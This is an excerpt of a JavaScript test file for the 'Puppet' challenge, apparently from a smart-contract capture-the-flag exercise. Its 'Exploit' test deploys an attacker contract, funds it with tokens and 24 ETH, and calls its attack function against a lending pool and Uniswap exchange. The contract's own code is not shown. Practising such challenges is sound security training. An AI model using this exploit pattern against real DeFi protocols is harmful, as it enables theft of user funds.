...
describe("[Challenge] Puppet", function () {
  ...
  it("Exploit", async function () {
    ...
    const attackerConctractFactory = await ethers.getContractFactory(
      "PuppetAttacker",
      attacker
    );
    this.attackerContract = await attackerConctractFactory.deploy(
      this.token.address,
      this.uniswapExchange.address,
      this.lendingPool.address
    );
    ...
    this.token
      .connect(attacker)
      .approve(this.attackerContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    this.token
      .connect(attacker)
      .transfer(this.attackerContract.address, ATTACKER_INITIAL_TOKEN_BALANCE);

    await attacker.sendTransaction({to:this.attackerContract.address,
    value: ethers.utils.parseEther("24") })
    tx = await this.attackerContract.attack(ATTACKER_INITIAL_TOKEN_BALANCE);
    await tx.wait(1);
  });
